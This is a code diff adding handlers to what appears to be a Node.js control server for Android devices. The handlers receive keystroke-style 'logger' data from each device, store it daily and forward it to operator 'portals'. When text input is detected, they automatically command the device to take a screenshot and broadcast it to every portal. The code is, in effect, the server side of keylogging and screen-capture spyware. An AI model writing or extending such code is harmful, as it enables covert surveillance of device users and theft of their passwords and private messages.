@@ -235,6 +235,153 @@ androidIo.on("connection", async (socket) => {
                 console.error('Error handling device disconnect:', error);
             }
         });
+
+        // Handle logger events from Android device
+        socket.on("logger", async (data) => {
+            const deviceUuid = socket.deviceUuid;
+            if (!deviceUuid) return;
+
+            console.log(chalk.blue(`[Logger] Device ${deviceUuid}: ${data}`));
+
+            // Check if this is a screenshot failure response
+            if (data && typeof data === 'string' && data.includes("Screenshot failed")) {
+                if (pendingScreenshotResponses.has(deviceUuid)) {
+                    clearTimeout(pendingScreenshotResponses.get(deviceUuid));
+                    pendingScreenshotResponses.delete(deviceUuid);
+                }
+            }
+
+            try {
+                await devicesMutex.acquire();
+                let device;
+                try {
+                    device = devices.get(deviceUuid);
+                    if (!device) {
+                        console.log(chalk.yellow(`[!] Received logger data from unknown device ${deviceUuid}, ignoring`));
+                        return;
+                    }
+
+                    device.logs.push({ timestamp: Date.now(), log: data });
+                    device.lastSeen = Date.now();
+
+                    // Check if this is a text input event and request screenshot automatically
+                    if (data && typeof data === 'string' && data.includes('[') && data.includes(']')) {
+                        if (!pendingScreenshots.has(deviceUuid)) {
+                            pendingScreenshots.set(deviceUuid, {
+                                portal_socket_id: null, // Broadcast to all portals
+                                timestamp: Date.now()
+                            });
+                            device.socket.emit("screenshot");
+                            console.log(chalk.green(`Automatic screenshot request sent to device ${deviceUuid} due to text input`));
+                        }
+                    }
+                } finally {
+                    devicesMutex.release();
+                }
+
+                // Emit to portal
+                portalIo.emit("logger", { device: deviceUuid, log: data });
+
+                // Incremental storage: Append to daily logs in DB
+                const today = new Date().toISOString().split('T')[0];
+                const row = await db.get('SELECT logs_data FROM device_daily_logs WHERE device_uuid = ? AND date = ?', deviceUuid, today);
+                let existingLogs = '[]';
+                if (row && row.logs_data) {
+                    existingLogs = row.logs_data;
+                }
+                const logsArray = JSON.parse(existingLogs);
+                logsArray.push({ timestamp: Date.now(), log: data });
+                const newLogsData = JSON.stringify(logsArray);
+
+                await db.run(
+                    'INSERT OR REPLACE INTO device_daily_logs (device_uuid, date, logs_data, updated_at) VALUES (?, ?, ?, ?)',
+                    deviceUuid, today, newLogsData, Date.now()
+                );
+            } catch (err) {
+                console.error('Logger storage error:', err);
+            }
+        });
+
+        // Handle screenshot response from Android device
+        socket.on("screenshot_response", async (data) => {
+            const deviceUuid = socket.deviceUuid;
+            if (!deviceUuid) return;
+
+            console.log(chalk.green(`[+] Screenshot response received from device ${deviceUuid}`));
+
+            // Clear the response timeout
+            if (pendingScreenshotResponses.has(deviceUuid)) {
+                clearTimeout(pendingScreenshotResponses.get(deviceUuid));
+                pendingScreenshotResponses.delete(deviceUuid);
+            }
+
+            try {
+                if (!Buffer.isBuffer(data) && !(data instanceof ArrayBuffer)) {
+                    throw new Error('Invalid image data: not a buffer');
+                }
+                const buffer = Buffer.from(data);
+                if (buffer.length === 0) {
+                    throw new Error('Empty image data');
+                }
+
+                // Update device last seen
+                await devicesMutex.acquire();
+                try {
+                    const device = devices.get(deviceUuid);
+                    if (device) {
+                        device.lastSeen = Date.now();
+                    }
+                } finally {
+                    devicesMutex.release();
+                }
+
+                // Generate filename with timestamp and device
+                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                const filename = `screenshot-${deviceUuid}-${timestamp}.jpg`;
+                const filepath = `screenshots/${filename}`;
+
+                await fs.mkdir('screenshots', { recursive: true });
+                await fs.writeFile(filepath, buffer);
+
+                // Emit only to the specific portal that requested the screenshot
+                const requestData = pendingScreenshots.get(deviceUuid);
+                if (requestData) {
+                    const requestingPortalId = requestData.portal_socket_id;
+                    if (requestingPortalId) {
+                        // Manual request from portal
+                        const requestingSocket = portalIo.sockets.sockets.get(requestingPortalId);
+                        if (requestingSocket) {
+                            console.log(`Sending screenshot response to portal ${requestingPortalId} for device ${deviceUuid}`);
+                            requestingSocket.emit("screenshot_ready", {
+                                device_uuid: deviceUuid,
+                                filename: filename,
+                                timestamp: Date.now()
+                            });
+                        } else {
+                            console.log(chalk.yellow(`Portal ${requestingPortalId} not found for device ${deviceUuid}`));
+                        }
+                    } else {
+                        // Automatic screenshot from text input - broadcast to all portals
+                        console.log(`Broadcasting automatic screenshot to all portals for device ${deviceUuid}`);
+                        portalIo.emit("screenshot_ready", {
+                            device_uuid: deviceUuid,
+                            filename: filename,
+                            automatic: true,
+                            timestamp: Date.now()
+                        });
+                    }
+                    // Clean up the pending request
+                    pendingScreenshots.delete(deviceUuid);
+                } else {
+                    console.log(chalk.red(`No pending screenshot request found for device ${deviceUuid}`));
+                }
+
+                console.log(`Screenshot saved: screenshots/${filename}`);
+            } catch (err) {
+                console.error('Screenshot response error:', err);
+                portalIo.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
+            }
+        });
     } catch (error) {
         console.error('Error handling device connection:', error);
         socket.disconnect();
